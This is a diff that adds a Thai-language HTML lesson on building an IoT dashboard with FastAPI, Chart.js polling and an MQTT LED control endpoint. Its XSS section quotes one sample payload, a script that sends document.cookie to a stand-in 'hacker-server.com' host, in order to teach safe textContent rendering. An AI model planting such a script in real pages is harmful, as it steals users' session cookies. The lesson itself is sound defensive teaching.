@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lesson 6: หน้าเว็บบอร์ดแสดงผลแบบตอบสนอง (Responsive Dashboard)</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <h1>บทเรียนที่ 6: หน้าเว็บบอร์ดแสดงผลแบบตอบสนอง (Responsive Dashboard)</h1>
+    <p>ในบทนี้ เราจะเสิร์ฟไฟล์ HTML/CSS/JS หน้าบ้านจากเซิร์ฟเวอร์ FastAPI, ทำระบบ REST Polling เพื่อขอรับข้อมูลเซ็นเซอร์ทุกๆ 5 วินาที, สร้างปุ่มสั่งเปิด-ปิดไฟแบบ Interactive และล็อกประตูความปลอดภัยด้วยการป้องกัน XSS</p>
+
+    <div class="card">
+        <h2>Part 1: Static Files Service in FastAPI</h2>
+        <p>แทนที่ต้องรันเซิร์ฟเวอร์หน้าบ้านแยกอีกตัว เราสั่งให้ FastAPI เสิร์ฟไฟล์คงที่ (Static Files เช่น หน้าจอแดชบอร์ด) จากโฟลเดอร์ฝั่งเครื่องแม่ข่ายโดยตรงได้ง่ายๆ:</p>
+        <p>1. ติดตั้งไลบรารีรองรับ (Aiofiles สำหรับ FastAPI static):</p>
+        <pre><code>pip install aiofiles</code></pre>
+        <p>2. เขียนคำสั่งเมาท์โฟลเดอร์ <code>/static</code> ในไฟล์ <code>main.py</code>:</p>
+        <pre><code>from fastapi import FastAPI
+from fastapi.staticfiles import StaticFiles
+
+app = FastAPI()
+
+# เมาท์โฟลเดอร์ static ไปยังพาธ /
+app.mount("/", StaticFiles(directory="static", html=True), name="static")</code></pre>
+        <p><em>หมายเหตุ: ตัวเลือก <code>html=True</code> จะทำให้ FastAPI ควานหาไฟล์ index.html ในโฟลเดอร์ static และส่งเป็นหน้าแรกโดยอัตโนมัติ</em></p>
+    </div>
+
+    <div class="card">
+        <h2>Part 2: REST Polling, Time-based Filtering & Chart.js Integration</h2>
+        <p>เพื่อตอบรับระบบดีไซน์สุดล้ำและฟังก์ชันการวิเคราะห์ข้อมูลที่ดีขึ้น หน้าแดชบอร์ดของเราจะใช้ไลบรารี <strong>Chart.js</strong> ในการวาดกราฟเส้นสีนีออนม่วง-ฟ้าแสดงแนวโน้มข้อมูลเซ็นเซอร์ พร้อมเพิ่มกล่อง Dropdown สำหรับกรองข้อมูลย้อนหลังตามช่วงเวลา (1 นาที, 15 นาที, 1 วัน และ 1 สัปดาห์):</p>
+        
+        <p><strong>1. ตัวอย่างไฟล์หน้าบ้านหลัก (static/index.html) ในธีมน้ำเงินม่วง:</strong></p>
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="th"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;⚡ IoT Cyber Dashboard&lt;/title&gt;
+    &lt;!-- โหลด Chart.js สำหรับวาดกราฟจาก CDN --&gt;
+    &lt;script src="https://cdn.jsdelivr.net/npm/chart.js"&gt;&lt;/script&gt;
+    &lt;link rel="stylesheet" href="style.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="dashboard-container"&gt;
+        &lt;h1&gt;⚡ IoT Real-time & History Hub&lt;/h1&gt;
+        
+        &lt;!-- 1. การ์ดแสดงค่าสูงสุดของวันนี้ (Daily Max Stats) --&gt;
+        &lt;div class="stats-grid"&gt;
+            &lt;div class="stat-card"&gt;
+                &lt;div class="card-title"&gt;Max Temperature (Today)&lt;/div&gt;
+                &lt;div class="card-value" id="max-temp"&gt;-- °C&lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class="stat-card"&gt;
+                &lt;div class="card-title"&gt;Max Humidity (Today)&lt;/div&gt;
+                &lt;div class="card-value" id="max-humidity"&gt;-- %&lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class="stat-card"&gt;
+                &lt;div class="card-title"&gt;Max Analog (Today)&lt;/div&gt;
+                &lt;div class="card-value" id="max-analog"&gt;--&lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;!-- 2. แผงควบคุมตัวกรอง (Control Filters) --&gt;
+        &lt;div class="control-panel"&gt;
+            &lt;label&gt;เลือกประเภทเซ็นเซอร์:&lt;/label&gt;
+            &lt;select id="sensor-filter" onchange="fetchHistoryAndRender()"&gt;
+                &lt;option value="esp32_temp"&gt;อุณหภูมิ ESP32&lt;/option&gt;
+                &lt;option value="esp32_humidity"&gt;ความชื้น ESP32&lt;/option&gt;
+                &lt;option value="esp8266_analog"&gt;แอนะล็อกสุ่ม ESP8266&lt;/option&gt;
+            &lt;/select&gt;
+
+            &lt;label&gt;ดูย้อนหลังเมื่อ:&lt;/label&gt;
+            &lt;select id="time-filter" onchange="fetchHistoryAndRender()"&gt;
+                &lt;option value="1m"&gt;1 นาทีที่แล้ว&lt;/option&gt;
+                &lt;option value="15m" selected&gt;15 นาทีที่แล้ว&lt;/option&gt;
+                &lt;option value="1d"&gt;1 วันก่อน&lt;/option&gt;
+                &lt;option value="7d"&gt;1 สัปดาห์ก่อน&lt;/option&gt;
+            &lt;/select&gt;
+
+            &lt;button class="btn-blink" onclick="triggerBlinkLed()"&gt;🚨 สั่ง Blink LED (ESP32)&lt;/button&gt;
+        &lt;/div&gt;
+
+        &lt;!-- 3. กราฟเส้น Chart.js --&gt;
+        &lt;div class="chart-container"&gt;
+            &lt;canvas id="sensorChart"&gt;&lt;/canvas&gt;
+        &lt;/div&gt;
+
+        &lt;!-- 4. ตารางบันทึกประวัติย้อนหลัง --&gt;
+        &lt;div class="table-container"&gt;
+            &lt;h3&gt;ตารางประวัติเวลา (SQLite Logs)&lt;/h3&gt;
+            &lt;table&gt;
+                &lt;thead&gt;
+                    &lt;tr&gt;
+                        &lt;th&gt;Timestamp (เวลาเซิร์ฟเวอร์)&lt;/th&gt;
+                        &lt;th&gt;Sensor Name&lt;/th&gt;
+                        &lt;th&gt;Value&lt;/th&gt;
+                    &lt;/tr&gt;
+                &lt;/thead&gt;
+                &lt;tbody id="history-tbody"&gt;&lt;/tbody&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;script src="dashboard.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+    </div>
+
+    <div class="card">
+        <h2>Part 3: Interactive Actuator Command (MQTT Command Propagation)</h2>
+        <p>เมื่อผู้ใช้คลิกปุ่ม <strong>"Blink LED"</strong> บนแดชบอร์ด หน้าเว็บจะยิง HTTP POST Request ไปที่ FastAPI Backend จากนั้นหลังบ้านจะแปลงคำสั่งและพับลิช (Publish) ข้อความ <code>"BLINK"</code> เข้าโบรกเกอร์ MQTT ด้วยความไวระดับมิลลิวินาที:</p>
+        
+        <p><strong>1. ฝั่ง Backend (main.py):</strong> จุดรับสัญญาณสั่งการทางไกล</p>
+        <pre><code>@app.post("/api/actuators/led")
+def control_led(status: str, mqtt_manager: MqttManager = Depends(get_mqtt_manager)):
+    if status in ["ON", "OFF", "BLINK"]:
+        # ส่งคำสั่งควบคุมไปยังบอร์ด ESP32 ผ่านหัวข้อ actuators/led
+        mqtt_manager.client.publish("actuators/led", status)
+        return {"status": "Success", "action": status}
+    return {"status": "Error", "message": "Invalid command status"}</code></pre>
+
+        <p><strong>2. ฝั่ง Frontend (static/dashboard.js) ตัวดึงและควบคุมค่า:</strong></p>
+        <pre><code>let sensorChart;
+
+// ฟังก์ชันดึงประวัติและวาดกราฟอิงตามประเภทเซ็นเซอร์และเวลากรอง
+async function fetchHistoryAndRender() {
+    const timeRange = document.getElementById("time-filter").value;
+    const sensorName = document.getElementById("sensor-filter").value;
+    
+    try {
+        // ดึงข้อมูลประวัติผ่าน Query API
+        const response = await fetch(`/api/sensors/history?sensor=${sensorName}&range=${timeRange}`);
+        const data = await response.json();
+        
+        // ดึงสถิติค่าสูงสุดประจำวันมาอัปเดตการ์ด
+        await updateMaxStats();
+        
+        // แปลงข้อมูลประมวลผลเข้ากราฟ
+        const labels = data.map(item => new Date(item.timestamp).toLocaleTimeString());
+        const values = data.map(item => item.value);
+        
+        renderChart(labels, values, sensorName);
+        renderTable(data);
+    } catch (err) {
+        console.error("Error loading dashboard data:", err);
+    }
+}
+
+// อัปเดตการ์ดแสดงผลค่าสูงสุดของวันดึงจาก Backend
+async function updateMaxStats() {
+    try {
+        const response = await fetch('/api/sensors/stats/max-today');
+        const stats = await response.json();
+        
+        document.getElementById('max-temp').textContent = stats.temp ? `${stats.temp} °C` : '-- °C';
+        document.getElementById('max-humidity').textContent = stats.humidity ? `${stats.humidity} %` : '-- %';
+        document.getElementById('max-analog').textContent = stats.analog ? `${stats.analog}` : '--';
+    } catch (err) {
+        console.error("Error updating statistics:", err);
+    }
+}
+
+// สั่ง Blink LED ไปยังบอร์ด ESP32
+async function triggerBlinkLed() {
+    try {
+        const response = await fetch('/api/actuators/led?status=BLINK', {
+            method: 'POST'
+        });
+        const result = await response.json();
+        console.log("MQTT Command Dispatched:", result);
+    } catch (err) {
+        console.error("Failed to send blink command:", err);
+    }
+}
+
+// ฟังก์ชันสร้าง/อัปเดตวาดกราฟเส้น Chart.js
+function renderChart(labels, values, sensorLabel) {
+    const ctx = document.getElementById('sensorChart').getContext('2d');
+    if (sensorChart) {
+        sensorChart.destroy(); // ทำลายกราฟเดิมทิ้งเพื่อป้องการทับซ้อนของ Canvas
+    }
+    
+    sensorChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: labels,
+            datasets: [{
+                label: `ประวัติค่า: ${sensorLabel}`,
+                data: values,
+                borderColor: '#8B5CF6',           // เส้นกราฟสีม่วงนีออน
+                backgroundColor: 'rgba(139, 92, 246, 0.15)', // เติมสีพื้นกราฟจางๆ
+                pointBackgroundColor: '#06B6D4',  // จุดข้อมูลสีฟ้านีออน
+                borderWidth: 2.5,
+                tension: 0.35 // วาดเส้นแบบโค้งมนสวยงาม (Modern Smooth Curves)
+            }]
+        },
+        options: {
+            responsive: true,
+            scales: {
+                x: { grid: { color: 'rgba(255, 255, 255, 0.05)' } },
+                y: { grid: { color: 'rgba(255, 255, 255, 0.05)' } }
+            }
+        }
+    });
+}</code></pre>
+    </div>
+
+    <div class="card">
+        <h2>Part 4: XSS (Cross-Site Scripting) Prevention</h2>
+        <p>ช่องโหว่ความปลอดภัยที่พบบ่อยในแดชบอร์ด IoT คือ หากมีผู้ไม่ประสงค์ดีส่ง JSON ปลอมปนโค้ด JavaScript ที่เป็นอันตรายผ่านช่องทาง MQTT (เช่น ตั้งชื่อเซ็นเซอร์ว่า <code>&lt;script&gt;fetch('hacker-server.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>) เข้ามา</p>
+        <p>หากแดชบอร์ดหน้าบ้านแสดงผลด้วยคำสั่ง <code>element.innerHTML = item.sensor_name</code> เบราว์เซอร์จะเปิดประมวลผลสคริปต์นั้นทันที ทำให้ถูกโจมตี!</p>
+        <div class="highlight-box">
+            <strong>🛡️ วิธีป้องกัน XSS ในการเรนเดอร์ตาราง:</strong> หลีกเลี่ยงการใช้ <code>.innerHTML</code> กับข้อมูลดิบที่รับมาจากผู้ใช้งาน ให้หันมาสร้าง Element และผูกค่าด้วยคำสั่ง <code>.textContent</code> หรือ <code>.innerText</code> เสมอ ซึ่งเบราว์เซอร์จะล้างรหัสสคริปต์และแปลงอักขระพิเศษอย่าง <code>&lt;</code> หรือ <code>&gt;</code> ให้กลายเป็นข้อความธรรมดาอย่างปลอดภัย
+        </div>
+        <pre><code>// 🛡️ โค้ดเรนเดอร์ตารางที่ปลอดภัย ป้องกัน XSS
+function renderTable(data) {
+    const tbody = document.getElementById('history-tbody');
+    tbody.innerHTML = '';
+    
+    data.forEach(item => {
+        const row = document.createElement('tr');
+        
+        const cellTime = document.createElement('td');
+        // ใช้ textContent ปลอดภัยสูงสุด
+        cellTime.textContent = new Date(item.timestamp).toLocaleString();
+        
+        const cellName = document.createElement('td');
+        cellName.textContent = item.sensor_name;
+        
+        const cellVal = document.createElement('td');
+        cellVal.textContent = `${item.value}`;
+        
+        row.appendChild(cellTime);
+        row.appendChild(cellName);
+        row.appendChild(cellVal);
+        tbody.appendChild(row);
+    });
+}</code></pre>
+    </div>
+
+    <div class="quiz">
+        <h2>🧠 ตรวจสอบความเข้าใจ (Quick Quiz)</h2>
+        <p>เพราะเหตุใดเราจึงเลือกใช้คำสั่ง <code>element.textContent = data</code> แทนการใช้ <code>element.innerHTML = data</code> ในการแสดงผลค่าของเซ็นเซอร์บนแดชบอร์ด?</p>
+        <div class="quiz-option" data-correct="false" data-feedback="ไม่จริง! textContent ทำงานรวดเร็วกว่าและปลอดภัยกว่าในการแปะข้อความดิบ">A) เพื่อช่วยเร่งความเร็วในการประมวลผล CSS แอนิเมชันในเบราว์เซอร์</div>
+        <div class="quiz-option" data-correct="true" data-feedback="ถูกต้อง! textContent จะปฏิเสธการประมวลผล HTML tags ทั้งหมด ทำให้ไม่โดนแฮกเกอร์ฝังสคริปต์เข้ามาโจมตีเว็บ (ป้องกัน XSS)">B) เพื่อป้องกันช่องโหว่ XSS (Cross-Site Scripting) จากการประมวลผล Payload ที่ประสงค์ร้ายเป็นรหัสสคริปต์</div>
+    </div>
+
+    <div class="citation">
+        <p>📖 <strong>ข้อมูลอ้างอิงและศึกษาเพิ่มเติม:</strong></p>
+        <ul>
+            <li>การป้องกัน Cross-Site Scripting (XSS): <a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS Attack Guide</a></li>
+            <li>การใช้งานเว็บบอร์ดวาดกราฟ: <a href="https://www.chartjs.org/docs/latest/" target="_blank">Chart.js Documentation</a></li>
+        </ul>
+        <p>💡 <em>ลิงก์บทเรียนย้อนหลัง: <a href="./0005-fastapi-mqtt-subscriber.html">บทเรียนที่ 5: เชื่อมต่อ MQTT เข้ากับ FastAPI</a></em></p>
+    </div>
+    <script src="../main.js"></script>
+</body>
+</html>
